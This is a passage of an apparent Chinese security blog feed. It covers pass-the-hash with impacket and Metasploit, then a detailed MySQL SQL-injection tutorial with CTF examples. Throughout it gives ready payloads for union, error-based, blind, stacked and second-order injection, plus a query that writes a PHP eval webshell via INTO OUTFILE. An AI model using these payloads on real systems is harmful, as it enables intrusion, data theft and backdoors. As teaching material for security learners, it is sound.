alt="image-20230324160952786"></p><h4 id="PTH-哈希传递攻击"><a href="#PTH-哈希传递攻击" class="headerlink" title="PTH 哈希传递攻击"></a>PTH 哈希传递攻击</h4><blockquote><p>挑战响应机制，只要知道NTLM哈希，无需知道明文密码，就可以通过认证</p></blockquote><ul><li>impacket</li></ul><p>安装：<code>sudo apt install python3-impacket</code></p><p><img src="/../images/image-20230331172307275-1686283281462.png" alt="image-20230331172307275"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains  xxx.py -hashes :91ff0fb948167eb4d080b5330686c02f  Administrator@192.168.52.138</span><br><span class="line"></span><br><span class="line">psexec.py</span><br><span class="line">smbexec.py</span><br><span class="line">wmiexec.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230331172323473-1686283281462.png" alt="image-20230331172323473"></p><p><img src="/../images/image-20230331172427568-1686283281462.png" alt="image-20230331172427568"></p><p><img src="/../images/image-20230331172508321-1686283281462.png" alt="image-20230331172508321"></p><ul><li><p>MSF</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass LM:NTLM</span><br><span class="line">set lhost 192.168.52.143</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><h4 id="PTT票据传递"><a href="#PTT票据传递" class="headerlink" title="PTT票据传递"></a>PTT票据传递</h4><blockquote><p>只要知道了KDC和Server密钥，即可伪造黄金票据和白银票据</p></blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_44159028/article/details/124631522">https://blog.csdn.net/qq_44159028/article/details/124631522</a></p><p><a href="https://blog.51cto.com/u_15127677/4045185">https://blog.51cto.com/u_15127677/4045185</a></p><p><a href="https://soapffz.com/archives/558/">https://soapffz.com/archives/558/</a></p><p><a href="https://xz.aliyun.com/t/2536">后渗透之meterpreter使用攻略 - 先知社区</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通过mysql学习sql注入</title>
      <link href="/2023/05/31/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/31/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>服务器将<strong>用户提交的参数</strong>错误地<strong>拼接到sql语句中</strong>，<strong>打破了数据区域的边界（数字型不需要）改变了原有的sql执行逻辑</strong>，导致攻击者可以执行恶意的sql语句。</p><p>简单的例子</p><p>假设</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where id=&#x27;<span class="subst">$id</span>&#x27;;&quot;</span></span><br></pre></td></tr></table></figure><p>用户提交</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and 1=1 #</span></span><br></pre></td></tr></table></figure><p>拼接后的sql语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and 1=1 #&#x27;</span><br></pre></td></tr></table></figure><p>要进行注入，只需要将<code>and 1=1</code>部分替换为其他sql语句即可。</p><blockquote><p>其实分析<code>sqlmap</code>的注入也是如此，注入语句由<code>prefix</code>，<code>payload</code>和<code>suffix</code>组成</p></blockquote><p>图来源<a href="https://www.freebuf.com/column/161797.html">https://www.freebuf.com/column/161797.html</a></p><p><img src="/../images/image-20230522131723064.png" alt="image-20230522131723064"></p><h2 id="漏洞危害–攻击面"><a href="#漏洞危害–攻击面" class="headerlink" title="漏洞危害–攻击面"></a>漏洞危害–攻击面</h2><ul><li><p>拿到敏感信息，如手机号，身份证，邮箱，家庭地址等</p></li><li><p>后台账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">万能密码？这年头还有吗🤔</span><br><span class="line">拿到密码，但是一般密码都是加盐再加密的了吧，需要彩虹表啥的。</span><br><span class="line">或者堆叠注入创建一个，修改一个等                       </span><br></pre></td></tr></table></figure></li><li><p>文件任意读取</p></li><li><p>Getshell</p></li><li><p>RCE</p></li><li><p>提权</p></li></ul><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/../images/image-20230522131900429.png" alt="image-20230522131900429"></p><h4 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h4><h5 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h5><p>站库分离，所以不能通过数据库进行读写</p><h5 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h5><ul><li><p>通用方法</p><p>读取配置文件，判断IP</p></li><li><p>Mysql</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@hostname; //服务端主机名称 select * from information_schema.PROCESSLIST; //客户端主机名称和端口</span><br></pre></td></tr></table></figure><blockquote><p>Windows连接格式：主机名:Port</p><p>Linux连接格式：IP:Port</p><p>本地连接格式：localhost:Port</p></blockquote><p><img src="/../images/image-20230522203905326.png" alt="image-20230522203905326"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user()；</span><br></pre></td></tr></table></figure><blockquote><p>如果不是localhost，大概率是站库分离。</p></blockquote><p><img src="/../images/image-20230522204233420.png" alt="image-20230522204233420"></p></li></ul><h4 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h4><p><img src="/../images/image-20230519205623244-1685603526750.png"></p><h4 id="各种信息"><a href="#各种信息" class="headerlink" title="各种信息"></a>各种信息</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ifnull(@@secure_file_priv,0) secure_file_priv为空时返回0,不为空时返回其值</span><br><span class="line">SELECT concat_ws(0x0a,</span><br><span class="line">ifnull(@@secure_file_priv,0),</span><br><span class="line">concat_ws(0xefbc8c, @@version, @@version_compile_os, @@version_compile_machine, @@version_comment),</span><br><span class="line">concat_ws(0xefbc8c, @@hostname, @@port),</span><br><span class="line">concat_ws(0xefbc8c, user(), database()),</span><br><span class="line">concat_ws(0xefbc8c, @@datadir, @@plugin_dir, @@tmpdir, @@basedir)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 结果</span><br><span class="line">0</span><br><span class="line">10.5.8-MariaDB-3，debian-linux-gnu，x86_64，Debian buildd-unstable</span><br><span class="line">kali，3306</span><br><span class="line">root@localhost</span><br><span class="line">/var/lib/mysql/，/usr/lib/mysql/plugin/，/tmp，/usr</span><br></pre></td></tr></table></figure><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><h4 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h4><p>一切与数据库有交互的地方，取决于后端从HTTP请求报文中提取了什么数据并拼接到sql语句中。</p><h4 id="是否存在sql注入"><a href="#是否存在sql注入" class="headerlink" title="是否存在sql注入"></a>是否存在sql注入</h4><ul><li><p>字符型or数字型：fuzz闭合类型</p></li><li><p>是否有报错，是否能逃逸执行sql语句（逻辑，延时等判断）</p></li></ul><h4 id="后端语句"><a href="#后端语句" class="headerlink" title="后端语句"></a>后端语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 得到后端执行的sql语句</span><br><span class="line">select * from test.users where id=1 union SELECT (select INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE &#x27;%673245283%&#x27; LIMIT</span><br><span class="line"> 1),2,3;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210843123.png" alt="image-20230528210843123"></p><h3 id="Mysql注入手段"><a href="#Mysql注入手段" class="headerlink" title="Mysql注入手段"></a>Mysql注入手段</h3><h4 id="admin登入"><a href="#admin登入" class="headerlink" title="admin登入"></a>admin登入</h4><ul><li><p>万能密码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 后端代码Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登陆成功&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过布尔运算让where恒为真</p><p><img src="/../images/image-20230312212035948.png" alt="image-20230312212035948"></p></li><li><p>注册覆盖</p><blockquote><p>admin (有个空格)或者 (有个空格)admin</p><p>原理：用户名字段长度&gt;5，所以可以添加空格，而sql语句执行时会将空格忽略。</p></blockquote><p><img src="/../images/image-20230312210909402.png" alt="image-20230312210909402"></p></li><li><p>联合查询构造临时用户</p><p><code>[GXYCTF2019]BabySQli</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 后端代码Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="variable">$users</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$passwords</span>=<span class="variable">$users</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)&lt;&gt;<span class="variable">$passwords</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; limit 1,2--+</span><br><span class="line"></span><br><span class="line">passwd=c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line"></span><br><span class="line">MD5(1)=c4ca4238a0b923820dcc509a6f75849b</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230312215147770.png" alt="image-20230312215147770"></p></li></ul><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>sql语句为<code>select</code>,页面有回显查询结果。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users where id=<span class="subst">$id</span> &quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br></pre></td></tr></table></figure><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><strong>先通过order by等语句判断列数，再判断哪一列是输出点，最后进行注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">联合查询，获取库名</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(schema_name),3 from information_schema.schemata#</span><br><span class="line"></span><br><span class="line">联合查询，获取表名 </span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;已知库名&#x27;#</span><br><span class="line"></span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=&#x27;已知库名&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">联合查询，获取字段名</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;已知表名&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">联合查询，获取字段值</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(字段1，字段2...) from 已知表名#</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>因为后端查询语句可能只拿第一行查询结果如<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>，所以需要构造一个不存在的值如-1，使得联合查询的结果成为第一行；</p><p>要查的表的名称(这个表是不是在现在使用的数据库中，没有的话表名&#x3D;数据库.表名)</p></blockquote><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><blockquote><p>后端使用的查询函数为<code>mysqli_multi_query()</code> ，支持多条语句查询</p><p>而不是<code>mysqli_query()</code> ，仅支持一条语句查询</p></blockquote><h5 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h5><ul><li><p>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎的影响</p></li><li><p>无回显：在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略</p><p><strong>解决方法</strong>：可以通过先将内容插入到数据库中，然后再通过查询查出来</p></li></ul><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;;sql语句;--+</span></span><br></pre></td></tr></table></figure><p>可以任意执行sql语句，危害很大</p><h6 id="配合handle绕过关键字"><a href="#配合handle绕过关键字" class="headerlink" title="配合handle绕过关键字"></a>配合handle绕过关键字</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler 表名  open ; handler 表名 read first; #打开表；读取第一条数据</span><br><span class="line">handler 表名 read next;#与上一条语句一起用，读取下一条即第二条数据</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">【MySQL】MySQL 之 handler 的详细使用及说明</a></p><h6 id="配合预编译语句绕过"><a href="#配合预编译语句绕过" class="headerlink" title="配合预编译语句绕过"></a>配合预编译语句绕过</h6><p>使用格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @tn = &#x27;hahaha&#x27;;  //存储表名</span><br><span class="line">set @sql = concat(&#x27;select * from &#x27;, @tn);  //存储SQL语句</span><br><span class="line"></span><br><span class="line">prepare query from @sql;   //预定义SQL语句</span><br><span class="line"></span><br><span class="line">execute query;  //执行预定义SQL语句</span><br><span class="line"></span><br><span class="line">(DEALLOCATE || DROP) prepare sqla;  //删除预定义SQL语句</span><br></pre></td></tr></table></figure><h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>[SUCTF 2018]MultiSQL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;;prepare name from @sql;execute name;</span><br></pre></td></tr></table></figure><p>转换脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&quot;select &#x27;&lt;?php eval($_POST[khaz]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell3.php&#x27;&quot;</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b.append(<span class="built_in">str</span>(<span class="built_in">ord</span>(i)))</span><br><span class="line">c=<span class="string">&#x27;,&#x27;</span>.join(b)</span><br><span class="line">res = <span class="string">&#x27;char(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(c)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set @sql=char(117,112,100,97,116,101,32,115,99,111,114,101,32,115,101,116,32,108,105,115,116,101,110,61,50,48,48);prepare query from @sql;execute query;</span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p><strong>使用<code>mysql_error()</code>函数，可以返回上一个Mysql操作产生的文本错误信息。</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;wrong_user&quot;</span>,<span class="string">&quot;wrong_pwd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;</span><br><span class="line">Access denied <span class="keyword">for</span> user <span class="string">&#x27;wrong_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">(using password: YES)</span><br></pre></td></tr></table></figure><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><p>最常用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Xpat语法错误，报错信息是有长度限制的，最大长度限制32位,配合substr()等截取字符串函数使用</span><br><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523184243091.png" alt="image-20230523184243091"></p><p>其他<a href="https://hatboy.github.io/2018/08/28/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">MySQL报错注入 </a></p><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原型：</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(),0x7e),1))--+</span><br><span class="line"></span><br><span class="line">爆库:</span><br><span class="line">?id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),1,32))from (information_schema.schemata)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">爆表：</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(table_name),1,32))from (information_schema.tables)where(table_schema=&#x27;已知库名&#x27;)),0x7e),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆列名：</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(column_name),1,32)))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆字段值</span><br><span class="line">id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(real_flag_1s_here),1,6)))from(users))),1))--+</span><br></pre></td></tr></table></figure><h4 id="二次注入–存储型注入"><a href="#二次注入–存储型注入" class="headerlink" title="二次注入–存储型注入"></a>二次注入–存储型注入</h4><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><p><img src="/../images/1.png" alt="ctf1"></p><p>常见转义函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>()</span><br><span class="line"><span class="title function_ invoke__">mysql_escape_string</span>()</span><br></pre></td></tr></table></figure><p>以<code>sql-labs Less-24</code>为例</p><p>创建用户</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>=  <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="subst">$username</span>\&quot;, \&quot;<span class="subst">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>使用不恰当的函数<code>mysql_escape_string</code>，功能为在 MySQL 中具有特殊含义的字符（如单引号、双引号、反斜杠和空字节）前添加反斜杠字符。所以脏数据还是进入到了数据库中。</p><p>修改密码处</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><p>直接将脏数据取出并拼接到sql语句中，造成了sql注入。</p><h5 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h5><p>将保存的脏数据从数据库中取出，再次进行sql操作的场景。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改密码，修改订单等修改已保存信息的地方</span><br><span class="line">注册用户名处</span><br></pre></td></tr></table></figure><h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><h6 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);<span class="comment">#可控变量</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;<span class="comment">#将$_POST[&quot;address&quot;]保存到数据库中</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();<span class="comment">#$row保存sql语句查询结果</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];<span class="comment">#调用了查询结果</span></span><br></pre></td></tr></table></figure><p>分析上面两条语句，对可控参数address只进行了转义处理，就保存到数据库中。</p><p>并且在update中引用了<code>$row[&#39;address&#39;]</code>，所以在这里存在二次注入。</p><p>可以看到列名为old_address，在进行修改时，会将旧地址保存下来，所以我们只要在第一次修改时，在address处注入恶意代码，第二次修改查询旧地址时就会执行恶意代码。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)# </span><br></pre></td></tr></table></figure><h4 id="盲注–无回显注入"><a href="#盲注–无回显注入" class="headerlink" title="盲注–无回显注入"></a>盲注–无回显注入</h4><p>推荐阅读：<a href="https://www.anquanke.com/post/id/266244">https://www.anquanke.com/post/id/266244</a></p><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>页面无数据回显，但是有两种返回状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 --+ # True</span><br><span class="line">?id=1&#x27; and 1=2 --+ # False</span><br></pre></td></tr></table></figure><p>实际</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=子查询 --+  </span><br></pre></td></tr></table></figure><p>子查询&#x3D;字符串截取+比较</p><h6 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h6><p><code>and 1=</code></p><table><thead><tr><th align="center">逻辑连接符</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">或</td><td align="center">or ，||</td></tr><tr><td align="center">异或</td><td align="center">xor，^</td></tr><tr><td align="center">按位与&#x2F;或</td><td align="center">&amp;，|</td></tr></tbody></table><p>字符串截取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 从start位置开始,截取len个字符</span><br><span class="line">substr(string,start,len)</span><br><span class="line">mid(string,start,len)</span><br><span class="line"></span><br><span class="line"># 从左/右截取len个字符</span><br><span class="line">left(string,len)</span><br><span class="line">right(string,len)</span><br></pre></td></tr></table></figure><p>比较</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like binary 0x25&#123;&#125;&#123;&#125;25</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230505230426015.png" alt="image-20230505230426015"></p><blockquote><p>因为大小写不敏感，所以要用<code>binary</code></p><p>BINARY将16进制转化为字符串</p></blockquote><p>语法</p><table><thead><tr><th align="center">like</th><th align="center">正则</th></tr></thead><tbody><tr><td align="center">_</td><td align="center">.</td></tr><tr><td align="center">%</td><td align="center">.*</td></tr><tr><td align="center">[]</td><td align="center">[]</td></tr><tr><td align="center">[^]</td><td align="center">[^]</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regexp &quot;^a&quot;</span><br><span class="line">regexp &quot;^ab&quot;</span><br></pre></td></tr></table></figure><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>时间盲注就是<strong>在布尔盲注上加了延迟时间函数sleep()</strong>,用在True和False回显难以区分时,通过页面的响应时间来判断布尔逻辑的正确与否。</p><h6 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(布尔,A,B)与三目运算符逻辑一样,加上sleep函数</span><br><span class="line"></span><br><span class="line">sleep(if(布尔,A,B))布尔正确,延迟A秒,布尔错误,延迟B秒</span><br><span class="line"></span><br><span class="line">或者 if(布尔,1,sleep(x))布尔正确,无延迟,布尔错误,延迟x秒</span><br></pre></td></tr></table></figure><p>![image-20230312232840696](..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;typora img&#x2F;image-20230312232840696.png)</p><h6 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h6><p>能造成延时效果的语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 通过执行多次命令形成延时</span><br><span class="line">benchmark(执行次数,sql语句)</span><br><span class="line"></span><br><span class="line"># 查询一些数据量比较大的表做笛卡尔集运算，导致查询缓慢</span><br><span class="line">select * from tab1 cross join tab2;</span><br><span class="line">select * from tab1,tab2;</span><br></pre></td></tr></table></figure><h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5><p>盲注都是需要脚本的，或者用sqlmap</p><h4 id="DNS外带注入"><a href="#DNS外带注入" class="headerlink" title="DNS外带注入"></a>DNS外带注入</h4><p>推荐阅读：<a href="https://www.anquanke.com/post/id/98096">Dnslog在SQL注入中的实战-安全客 - 安全资讯平台</a></p><h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><ol><li><p>MySQL Load_File()函数可以发起请求，使用Dnslog接收请求，获取数据；</p></li><li><p>windows下存在<code>UNC路径</code></p><blockquote><p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\xxxx\xx</span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20230425175525555.png" alt="image-20230425175525555"></p><p>   <img src="/../images/image-20230425175452805.png" alt="image-20230425175452805"></p></li></ol><h5 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h5><ul><li>windows系统</li><li><code>secure_file_priv</code>为空</li></ul><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span 